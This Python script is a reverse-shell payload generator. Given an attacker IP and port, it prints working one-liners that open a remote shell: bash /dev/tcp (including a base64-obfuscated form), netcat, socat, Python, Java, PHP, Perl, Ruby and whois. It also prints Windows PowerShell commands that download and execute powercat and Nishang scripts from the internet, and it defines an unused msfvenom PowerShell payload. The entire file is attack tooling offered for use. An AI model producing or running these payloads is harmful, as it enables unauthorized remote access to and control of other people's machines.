#! /usr/local/bin/python3

import sys
import base64
from colorama import Fore, Style

def typeBash(ip, port):
    return 'bash -i >& /dev/tcp/{0}/{1} 0>&1'.format(ip, port)

def typeBashBase64(ip, port):
    shellcode = 'bash -i >& /dev/tcp/{0}/{1} 0>&1'.format(ip, port).encode()
    b64shellcode = base64.b64encode(shellcode).decode()
    return 'bash -c {echo,' + b64shellcode + '}|{base64,-d}|{bash,-i}'

def typeNc(ip, port):
    return 'nc {0} {1} -t -e /bin/bash'.format(ip, port)

def typeSocat(ip, port):
    return '[C2] socat TCP-LISTEN:{0} -\n[Target] socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{1}:{2}'.format(ip, ip, port)

def typePython(ip, port):
    return 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''.format(ip, port)

def typeJava(ip, port):
    return '''r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
p.waitFor()'''.format(ip, port)

def typePhp(ip, port):
    return 'php -r \'$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");\''.format(ip, port)

def typePerl(ip, port):
    return 'perl -e \'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''.format(ip, port)

def typeWhois(ip, port):
    return '[C2] nc -lvp {0}\n[Target] whois -h {1} -p {2} `whoami`'.format(port, ip, port)

def typeRuby(ip, port):
    return 'ruby -rsocket -e\'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''.format(ip, port)

def typePowercatW(ip, port):
    return 'System.Net.Webclient).DownloadString(\'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1\');powercat -c {0} -p {1} -e cmd'.format(ip, port)

def typeNcW(ip, port):
    return 'nc.exe {0} {1} -e c:\\windows\\system32\\cmd.exe'.format(ip, port)

def typeNishangTCPW(ip, port):
    return 'IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1\');Invoke-PowerShellTcp -Reverse -IPAddress {0} -port {1}'.format(ip, port)

def typeNishangUDPW(ip, port):
    return '''IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellUdp.ps1');Invoke-PowerShellUdp -Reverse -IPAddress {0} -port {1}'''.format(ip, port)

def typeMsfEasypowershellW(ip, port):
    return '''$ msfvenom -p cmd/windows/reverse_powershell LHOST={0} LPORT={1}
powershell -w hidden -nop -c $a='{2}';$b={3};$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) {    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) {      $r=$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    }    if ($esread.IsCompleted -and $esread.Result -ne 0) {      $r=$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    }    if ($s.DataAvailable) {      $r=$s.Read($nb,0,$nb.Length);      if ($r -lt 1) {          break;      } else {          $str=$e.GetString($nb,0,$r);          $is.write($str);      }    }    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {        break;    }    if ($p.ExitCode -ne $null) {        break;    }}'''.format(ip, port, ip, port)

def cprint(title, contents):
    clength = len(contents) if not contents.startswith('[C2] ') else len(contents.split('[Target] ')[-1])
    print(Fore.MAGENTA + Style.BRIGHT + title + Style.NORMAL + Style.DIM + ' Size:' + str(clength) + Style.RESET_ALL + '\n' + contents)

def cprintW(title, contents):
    clength = len(contents) if not contents.startswith('[C2] ') else len(contents.split('[Target] ')[-1])
    print(Fore.LIGHTBLUE_EX + Style.BRIGHT + title + Style.NORMAL + Style.DIM + ' Size:' + str(clength) + Style.RESET_ALL + '\n' + contents)


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f'Usage: python {sys.argv[0]} ip:port')
        exit(1)
    ip, port = sys.argv[1].split(':')
    if int(port) > 65535 or int(port) < 0:
        print(Fore.RED + 'Port error, between 1 and 65535')
        exit(1)
    cprint('[Bash]', typeBash(ip, port))
    cprint('[Bash+Base64]', typeBashBase64(ip, port))
    cprint('[nc]', typeNc(ip, port))
    cprint('[Socat]', typeSocat(ip, port))
    cprint('[Python]', typePython(ip, port))
    cprint('[Java]', typeJava(ip, port))
    cprint('[Php]', typePhp(ip, port))
    cprint('[Perl]', typePerl(ip, port))
    cprint('[Whois]', typeWhois(ip, port))
    cprintW('[Win Powercat]', typePowercatW(ip, port))
    cprintW('[Win Nc]', typeNcW(ip, port))
    cprintW('[Win NishangTCP]', typeNishangTCPW(ip, port))
    cprintW('[Win NishangUDP]', typeNishangUDPW(ip, port))
